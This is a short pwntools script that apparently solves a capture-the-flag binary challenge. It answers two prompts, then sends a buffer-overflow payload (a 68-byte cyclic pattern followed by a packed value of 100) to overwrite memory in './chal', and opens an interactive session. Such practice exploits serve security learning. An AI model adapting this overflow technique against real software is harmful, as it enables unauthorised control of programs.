from pwn import *

p = process('./chal')

p.sendlineafter("Number : ", '22116969')
p.sendlineafter("Name : ", 'some_name')
p.sendlineafter("Comments ?", cyclic(68) + p32(100))

p.interactive()
